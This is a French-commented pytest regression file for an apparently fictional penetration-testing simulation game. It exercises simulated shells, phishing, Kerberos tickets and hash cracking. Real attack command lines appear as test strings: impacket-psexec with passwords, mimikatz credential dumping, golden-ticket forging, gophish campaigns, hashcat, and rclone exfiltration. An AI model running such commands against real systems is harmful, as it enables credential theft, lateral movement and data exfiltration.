"""Régressions des limites corrigées : shell, déploiement, temps et variantes."""
from pathlib import Path
import asyncio
import json
import shlex
import pytest
import httpx
from engine import contracts, terminal, console_sessions, social
from engine.deployment import TOOL_MARKERS
from engine.game_loop import GameLoop, load_all_abilities
from engine.persistence import state_from_dict, state_to_dict
from engine.models import Credential, ActionContext
from api.main import app, career, GAMES
from support import command, phish, upload
from validation import play_campaign

ROOT = Path(__file__).parents[1]
ABILITIES = load_all_abilities()


def tutorial():
    state = contracts.start_contract(contracts.load_contract(ROOT/'contracts/tuto_p0.json', known_ability_ids=set(ABILITIES)), 'Operator', known_ability_ids=set(ABILITIES))
    return state, GameLoop(state, ABILITIES)


def open_windows():
    state, loop = tutorial()
    phish(state, loop)
    command(state, loop, 'impacket-psexec m.leroux:Password123!@10.20.0.21')
    return state, loop


def test_alternative_campaign_passes_six_scenarios_without_legacy_commands():
    result = asyncio.run(play_campaign(variant='alternative'))
    assert len(result['scenarios']) == 6
    assert all(s['status'] == 'passed' for s in result['scenarios'])
    assert sum(s['resumes'] for s in result['scenarios']) == 18


@pytest.mark.parametrize('line', ['gophish poste-accueil','mimikatz poste-accueil --as m.leroux','psexec srv-fichiers --as it.presta','secretsdump srv-fichiers --as it.presta','ticketer srv-fichiers --as krbtgt'])
def test_prototype_shortcuts_no_longer_execute(line):
    state, _ = tutorial()
    result = terminal.parse(line, state, ABILITIES)
    assert not result.ok and result.action is None
    assert not state.loot


def test_scp_authentication_transfers_only_virtual_tool_and_preserves_local_shell():
    state, loop = tutorial(); phish(state, loop)
    before = state.terminal_host
    command(state, loop, 'scp ~/tools/mimikatz.exe m.leroux@10.20.0.21:C:/Tools/mimikatz.exe')
    assert state.terminal_auth['kind'] == 'scp'
    restored = state_from_dict(state_to_dict(state))
    assert not terminal.parse('wrong', restored, ABILITIES).ok
    assert terminal.parse('Password123!', restored, ABILITIES).ok
    assert restored.hosts['poste-accueil'].files['/Tools/mimikatz.exe'] == TOOL_MARKERS['mimikatz']
    assert not restored.terminal_auth and restored.terminal_host == before


def test_deployment_checks_rights_and_does_not_invent_an_installed_tool():
    state, loop = open_windows()
    denied = terminal.parse('mimikatz "privilege::debug" "sekurlsa::logonpasswords" exit', state, ABILITIES)
    assert not denied.ok and 'transféré' in denied.output[0]
    upload(state, loop, state.hosts['poste-accueil'], state.find_credential('m.leroux','PLAINTEXT'))
    command(state, loop, 'C:\\Tools\\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit')
    assert state.find_credential('it.presta','NTLM_HASH')
    with console_sessions.using(state,'upload-denied'):
        assert not terminal.parse('smbclient //10.20.0.10/C$ -U m.leroux%Password123! -c "put /home/operator/tools/mimikatz.exe Tools/mimikatz.exe"',state,ABILITIES).ok
    assert '/Tools/mimikatz.exe' not in state.hosts['srv-fichiers'].files


def test_powershell_nested_shell_files_parameters_and_saved_return_stack():
    state, loop = open_windows()
    state.hosts['poste-accueil'].files['/srv/notes.txt'] = 'Première ligne\nDeuxième ligne'
    command(state, loop, 'powershell -NoLogo -NoProfile')
    assert state.terminal_shell == 'powershell'
    assert command(state, loop, 'Get-Content -LiteralPath C:\\Data\\notes.txt -Raw').output == ['Première ligne\nDeuxième ligne']
    assert command(state, loop, 'Get-ChildItem -Path C:\\Data -Name').output == ['notes.txt']
    assert not terminal.parse('Get-Content C:\\Data\\notes.txt -Invented',state,ABILITIES).ok
    assert not terminal.parse('Get-Content C:\\Data\\notes.txt | Remove-Item',state,ABILITIES).ok
    command(state, loop, 'Copy-Item -Path C:\\Data\\notes.txt -Destination C:\\Tools\\copie.txt')
    assert command(state, loop, 'Test-Path C:\\Tools\\copie.txt').output == ['True']
    restored = state_from_dict(state_to_dict(state)); resumed = GameLoop(restored,ABILITIES)
    command(restored,resumed,'exit')
    assert restored.terminal_shell == 'cmd' and restored.terminal_host == 'poste-accueil'
    command(restored,resumed,'exit')
    assert restored.terminal_shell == 'bash' and restored.terminal_host is None
    assert restored.terminal_cwd == '/home/operator'


def test_one_shot_powershell_returns_to_cmd_and_preserves_context():
    state, loop = open_windows()
    result = command(state, loop, 'powershell -Command "Get-Location"')
    assert 'C:\\Windows\\system32' in result.output
    assert state.terminal_shell == 'cmd'
    assert not terminal.parse('nmap 10.20.0.0/24',state,ABILITIES).ok


def test_scan_shows_closed_and_filtered_ports_and_rejects_bad_network():
    state, loop = tutorial()
    assert not terminal.parse('nmap 10.20.0.999/24',state,ABILITIES).ok
    command(state, loop, 'nmap -p 22,80 10.20.0.21')
    assert '80/tcp  closed  http' in state.history[-1].message
    assert '445' not in terminal.parse('hosts',state,ABILITIES).output[0]
    state.firewall_blocks.add(('poste-accueil',22))
    command(state,loop,'nmap -p 22 10.20.0.21')
    assert '22/tcp  filtered  ssh' in state.history[-1].message
    state.hosts['poste-accueil'].status='ISOLATED'
    command(state,loop,'nmap -Pn -p 22 10.20.0.21')
    assert '22/tcp  filtered' in state.history[-1].message


@pytest.mark.parametrize('policy', ['capture_disabled','mail_filtered','smtp_unavailable'])
def test_mail_resources_and_filter_change_the_outcome(policy):
    state, loop = tutorial()
    command(state,loop,'gophish --config /opt/gophish/config.json','mail')
    data=state.tool_data['gophish']
    if policy=='capture_disabled': data['pages'][0]['capture_passwords']=False
    if policy=='mail_filtered':
        state.hosts['poste-accueil'].phishing['blocked_subjects']=['test filtré']
        data['templates'][0]['subject']='Test filtré'
    if policy=='smtp_unavailable': data['smtp'][0]['host']='offline.lab.invalid:25'
    command(state,loop,'API_KEY=$(cat ~/gophish/api-key.txt)','api')
    command(state,loop,'curl -k -H "Authorization: $API_KEY" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/','api')
    assert not state.loot and state.history[-1].reason==policy
    assert state.tool_data['gophish']['campaigns'][0]['status'] in {'Completed','Error'}


def test_office_hours_delay_a_campaign_without_granting_credentials():
    state, loop = tutorial()
    state.hosts['poste-accueil'].phishing['availability']={'start':10*60,'end':18*60}
    command(state,loop,'gophish --config /opt/gophish/config.json','mail')
    command(state,loop,'API_KEY=$(cat ~/gophish/api-key.txt)','api')
    with console_sessions.using(state,'api'):
        result=terminal.parse('curl -k -H "Authorization: $API_KEY" -d @/home/operator/gophish/campaign.json https://127.0.0.1:3333/api/campaigns/',state,ABILITIES)
        loop.submit(result.action)
    assert loop._queue[0].params['availability_wait_minutes']==60
    loop.tick()
    assert not state.loot


def test_personal_availability_is_shared_by_presence_and_reply_scheduler(tmp_path):
    from engine.career import Career
    profile=Career(tmp_path/'career.json')
    social.advance(profile,10*60)  # 19:00 : miette est absente.
    social.queue_chat(profile,'chordly','miette','Operator','Salut')
    contact=next(c for c in social.view(profile)['contacts'] if c['id']=='miette')
    assert contact['presence']=='offline' and not contact['typing']
    pending=next(e for e in profile.data['social']['pending'] if e['target']=='miette')
    assert pending['due']==24*60  # Prochain passage à 09:00.
    social.advance(profile,1)
    assert not any(m['sender']=='miette' and m.get('peer')=='miette' for m in profile.data['conversations'].values())


def test_wait_world_advances_mission_and_refuses_a_paused_mission():
    async def run():
        async with httpx.AsyncClient(transport=httpx.ASGITransport(app=app),base_url='http://test') as client:
            gid=(await client.post('/api/games',json={'contract':'tuto_p0','handle':'Operator'})).json()['id']
            result=await client.post('/api/world/wait',json={'minutes':1,'game_id':gid})
            assert result.status_code==200
            assert result.json()['state']['tick']==3 and result.json()['social']['minute']==1
            await client.post(f'/api/games/{gid}/pause',json={})
            assert (await client.post('/api/world/wait',json={'minutes':1,'game_id':gid})).status_code==409
            assert (await client.post('/api/world/wait',json={'minutes':1})).status_code==409
    asyncio.run(run())


def test_ticket_expiry_and_hostname_are_verified_on_use():
    contract=contracts.load_contract(ROOT/'contracts/varenne.json',known_ability_ids=set(ABILITIES))
    state=contracts.start_contract(contract,'Operator',known_ability_ids=set(ABILITIES));loop=GameLoop(state,ABILITIES)
    state.discovered=set(state.hosts)
    state.loot.append(Credential('KRBTGT_HASH','krbtgt','a'*32,'srv-fichiers'))
    domain=state.domain
    command(state,loop,f"impacket-ticketer -nthash {'a'*32} -domain-sid {domain['sid']} -domain {domain['name']} -duration 1 administrator")
    command(state,loop,'export KRB5CCNAME=/home/operator/administrator.ccache')
    assert not terminal.parse(f"impacket-psexec -k -no-pass {domain['name']}/administrator@10.53.12.10",state,ABILITIES).ok
    state.environment['world_minute']=61
    result=terminal.parse(f"impacket-psexec -k -no-pass {domain['name']}/administrator@VAR-DC-FS01",state,ABILITIES)
    assert not result.ok and 'TKT_EXPIRED' in result.output[0]


def test_logs_do_not_infer_kerberos_or_hash_theft_from_password_type():
    state, loop=open_windows()
    log=next(log for log in state.logs if log.event_id=='4624')
    assert log.data['AuthenticationPackageName']=='NTLM' and log.data['KeyLength']==128
    assert not any('Pass-the-Hash Detected'==a.title for a in state.alerts)


@pytest.mark.parametrize('plain,digest',[(b'', '31d6cfe0d16ae931b73c59d7e0c089c0'),(b'a','bde52cb31de33e46245e05fbdbd6fb24'),(b'abc','a448017aaf21d8525fc10ae87aa6729d'),(b'message digest','d9130a8164549fe818874806e1c7014b')])
def test_md4_matches_rfc1320_vectors(plain,digest):
    from engine.ntlm import md4
    assert md4(plain).hex()==digest


def test_nt_hash_matches_microsoft_protocol_vector():
    from engine.ntlm import nt_hash
    assert nt_hash('Password')=='a4f49c406510bdcab6824ee7c30fd852'


def test_hashcat_reads_hash_and_dictionary_contents_then_saves_potfile():
    from engine.ntlm import nt_hash
    contract=contracts.load_contract(ROOT/'contracts/rival.json',known_ability_ids=set(ABILITIES))
    state=contracts.start_contract(contract,'Operator',known_ability_ids=set(ABILITIES));loop=GameLoop(state,ABILITIES)
    user=state.hosts['poste-accueil'].cached_logons[0]
    value=nt_hash(state.users[user].password)
    state.loot.append(Credential('NTLM_HASH',user,value,'poste-accueil'))
    state.terminal_files['/tmp/input.txt']=value+'\n'
    state.terminal_files['/tmp/words.txt']='un autre mot\n'
    command(state,loop,'hashcat -m 1000 -a 0 /tmp/input.txt /tmp/words.txt')
    assert state.history[-1].reason=='wordlist_exhausted'
    assert state.terminal_last_exit==1 and not state.find_credential(user,'PLAINTEXT')
    state.terminal_files['/tmp/input.txt']='fichier invalide'
    assert not terminal.parse('hashcat -m 1000 /tmp/input.txt /tmp/words.txt',state,ABILITIES).ok
    state.terminal_files['/tmp/input.txt']=value+'\n'
    state.terminal_files['/tmp/words.txt']=state.users[user].password+'\n'
    command(state,loop,'hashcat -m 1000 /tmp/input.txt /tmp/words.txt')
    assert state.find_credential(user,'PLAINTEXT').value==state.users[user].password
    restored=state_from_dict(state_to_dict(state))
    assert terminal.parse('hashcat -m 1000 --show /tmp/input.txt',restored,ABILITIES).output==[value+':'+state.users[user].password]


def test_exit_codes_are_local_to_console_and_survive_save():
    state,loop=tutorial()
    with console_sessions.using(state,'main'):
        assert terminal.parse('commande_inconnue',state,ABILITIES).exit_code==127
    with console_sessions.using(state,'second'):
        assert terminal.parse('echo $?',state,ABILITIES).output==['0']
    restored=state_from_dict(state_to_dict(state))
    with console_sessions.using(restored,'main'):
        assert terminal.parse('echo $?',restored,ABILITIES).output==['127']
        error=terminal.parse('curl -k https://127.0.0.1:3333/api/groups/',restored,ABILITIES)
        assert error.exit_code==7


def test_powershell_status_does_not_replace_native_last_exit_on_cmdlet_failure():
    state,loop=open_windows()
    command(state,loop,'powershell')
    assert terminal.parse('Get-Content C:\\Data\\inexistant.txt',state,ABILITIES).exit_code==1
    assert terminal.parse('$?',state,ABILITIES).output==['False']
    assert terminal.parse('$LASTEXITCODE',state,ABILITIES).output==['0']
    assert terminal.parse('UneCommandeAbsente',state,ABILITIES).exit_code==1
    assert terminal.parse('$LASTEXITCODE',state,ABILITIES).output==['0']


def test_authentication_uses_world_password_and_prompts_when_not_supplied():
    state,loop=tutorial()
    assert not state.loot
    command(state,loop,'impacket-psexec m.leroux@10.20.0.21')
    assert state.terminal_auth['kind']=='impacket'
    command(state,loop,'Password123!')
    assert state.terminal_host=='poste-accueil' and state.terminal_access=='SYSTEM'
    assert state.find_credential('m.leroux','PLAINTEXT')


def test_password_rotation_invalidates_a_queued_login_snapshot():
    state,loop=tutorial();phish(state,loop)
    with console_sessions.using(state,'auth'):
        parsed=terminal.parse('impacket-psexec m.leroux:Password123!@10.20.0.21',state,ABILITIES)
        loop.submit(parsed.action)
    state.users['m.leroux'].password='NouveauMotDePasse!'
    # Ajouter un autre secret au butin ne doit pas modifier la commande déjà en attente.
    state.loot.append(Credential('PLAINTEXT','m.leroux','NouveauMotDePasse!','poste-accueil'))
    loop.tick()
    assert not state.history[-1].success and state.hosts['poste-accueil'].status=='HEALTHY'


def test_contextual_human_reactions_vary_and_reload_does_not_reroll():
    from engine.human_behavior import decide
    from engine.shell_tools import prepare
    contract=contracts.load_contract(ROOT/'contracts/morel.json',known_ability_ids=set(ABILITIES))
    outcomes=set()
    for seed in range(64):
        state=contracts.start_contract(contract,'Operator',rng_seed=seed,known_ability_ids=set(ABILITIES));prepare(state)
        outcomes.add(decide(state,state.hosts['poste-accueil'],{}))
    assert outcomes=={'submitted','ignored','reported'}
    first=contracts.start_contract(contract,'Operator',rng_seed=7,known_ability_ids=set(ABILITIES));prepare(first)
    decide(first,first.hosts['poste-accueil'],{})
    before=next(iter(first.tool_data['human_memory'].values()))['last_suspicion']
    restored=state_from_dict(state_to_dict(first))
    assert decide(first,first.hosts['poste-accueil'],{})==decide(restored,restored.hosts['poste-accueil'],{})
    assert first.tool_data['human_memory']==restored.tool_data['human_memory']
    assert next(iter(first.tool_data['human_memory'].values()))['last_suspicion']>before


def test_failure_paths_restore_each_scenario_before_timeout():
    from validation_suite import failure_paths
    records=asyncio.run(failure_paths())
    assert len(records)==6
    assert all(record['resumed']['status']=='RUNNING' and record['failure']['end_reason']=='timeout' and record['failure']['contract']['payout']==0 for record in records)


def test_rclone_copies_only_the_requested_directory():
    contract=contracts.load_contract(ROOT/'contracts/morel.json',known_ability_ids=set(ABILITIES))
    state=contracts.start_contract(contract,'Operator',known_ability_ids=set(ABILITIES));loop=GameLoop(state,ABILITIES)
    host=state.hosts['srv-fichiers'];state.discovered.add(host.id)
    user=host.admin_users[0];password=state.users[user].password
    command(state,loop,f'impacket-psexec {user}:{password}@{host.ip}')
    credential=state.find_credential(user,'PLAINTEXT')
    upload(state,loop,host,credential,'rclone')
    command(state,loop,'rclone copy C:\\Data remote:loot')
    assert state.exfiltrated and all('/srv/' in path for path in state.exfiltrated)
    assert all('/Tools/' not in path for path in state.exfiltrated)


def test_legacy_hash_migration_keeps_network_and_repairs_known_prototype_artifacts():
    import hashlib
    from engine.ntlm import nt_hash
    state,loop=tutorial()
    old=hashlib.sha256(b'fictional:poste-accueil:it.presta').hexdigest()[:32]
    state.loot.append(Credential('NTLM_HASH','it.presta',old,'poste-accueil'))
    state.terminal_files['/home/operator/loot/it.presta.ntlm']=old+'\n'
    data=json.loads(json.dumps(state_to_dict(state)))
    for user in data['users']:user.pop('password')
    restored=state_from_dict(data)
    assert restored.hosts['poste-accueil'].ip=='10.20.0.21'
    credential=restored.find_credential('it.presta','NTLM_HASH')
    assert credential.value==nt_hash('sim-password-it.presta')
    assert restored.terminal_files['/home/operator/loot/it.presta.ntlm']==credential.value+'\n'
    assert restored.tool_data['legacy_hash_aliases'][old]==credential.value


def test_repeated_reports_escalate_and_defender_reacts():
    state,loop=tutorial()
    state.hosts['poste-accueil'].phishing['response']='reported'
    state.defender={'enabled':True,'reaction_ticks':2}
    phish(state,loop);phish(state,loop)
    reports=[a for a in state.alerts if a.rule_id=='USER-REPORT']
    assert [a.severity for a in reports]==['MEDIUM','HIGH']
    loop.tick();loop.tick()
    assert state.hosts['poste-accueil'].status=='ISOLATED'


def test_encrypted_virtual_document_no_longer_reads_as_plaintext():
    from engine.effects import encrypt_host
    state,loop=open_windows()
    host=state.hosts['poste-accueil']
    host.files['/srv/document.txt']='Document métier fictif en clair'
    encrypt_host(state,ActionContext('red',host,state.tick))
    result=terminal.parse('type C:\\Data\\document.txt',state,ABILITIES)
    assert result.ok and 'Document métier fictif en clair' not in result.output[0]
    assert 'chiffrées' in result.output[0]
    restored=state_from_dict(state_to_dict(state))
    assert restored.hosts[host.id].files['/srv/document.txt']==host.files['/srv/document.txt']
